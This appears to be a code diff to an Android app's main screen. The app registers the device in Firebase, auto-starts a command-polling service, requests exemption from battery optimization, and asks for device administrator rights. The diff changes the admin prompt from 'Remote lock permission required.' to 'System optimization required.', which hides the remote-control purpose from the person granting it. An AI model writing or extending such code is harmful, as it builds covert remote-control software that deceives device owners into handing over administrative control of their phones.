@@ -32,6 +32,9 @@ public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+
+        Thread.setDefaultUncaughtExceptionHandler(new CrashHandler(this));
+
         setContentView(R.layout.activity_main);
 
         dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
@@ -61,15 +64,15 @@ public class MainActivity extends Activity {
                     Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                     intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                     intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                            "Remote lock permission required.");
+                            "System optimization required.");
                     startActivity(intent);
                 } else {
-                    Toast.makeText(MainActivity.this, "Admin already active", Toast.LENGTH_SHORT).show();
+                    Toast.makeText(MainActivity.this, "Already active", Toast.LENGTH_SHORT).show();
                 }
             }
         });
 
-        // Start Service বাটন (ম্যানুয়াল, তবু রাখলাম)
+        // Start Service বাটন (ম্যানুয়াল, তবুও রাখলাম)
         startBtn.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
@@ -78,10 +81,10 @@ public class MainActivity extends Activity {
             }
         });
 
-        // Firebase-এ ডিভাইস রেজিস্টার
+        // ✅ Firebase-এ ডিভাইস রেজিস্টার
         registerDeviceInFirebase();
 
-        // ✅ অটো-স্টার্ট: অ্যাপ খুললেই সার্ভিস চালু
+        // ✅✅✅ অ্যাপ খুললেই সার্ভিস চালু হবে
         startService(new Intent(MainActivity.this, CommandPoller.class));
 
         // ✅ ব্যাটারি অপটিমাইজেশন ignore চাওয়া
@@ -101,14 +104,15 @@ public class MainActivity extends Activity {
                     Toast.makeText(MainActivity.this, "Registered", Toast.LENGTH_SHORT).show();
                 })
                 .addOnFailureListener(e -> {
-                    Toast.makeText(MainActivity.this, "Firebase error: " + e.getMessage(), Toast.LENGTH_LONG).show();
+                    Toast.makeText(MainActivity.this,
+                            "Firebase error: " + e.getMessage(), Toast.LENGTH_LONG).show();
                 });
     }
 
     private void requestIgnoreBatteryOptimization() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
-            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
+            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                 try {
                     Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                     intent.setData(Uri.parse("package:" + getPackageName()));
@@ -123,8 +127,13 @@ public class MainActivity extends Activity {
     @Override
     protected void onResume() {
         super.onResume();
-        TextView statusText = findViewById(R.id.statusText);
-        String adminStatus = dpm.isAdminActive(adminComponent) ? "Admin: ACTIVE" : "Admin: INACTIVE";
-        statusText.setText("Device ID: " + deviceId + "\n" + adminStatus);
+        try {
+            TextView statusText = findViewById(R.id.statusText);
+            String adminStatus = dpm.isAdminActive(adminComponent)
+                    ? "Admin: ACTIVE" : "Admin: INACTIVE";
+            statusText.setText("Device ID: " + deviceId + "\n" + adminStatus);
+        } catch (Exception e) {
+            // ignore
+        }
     }
 }
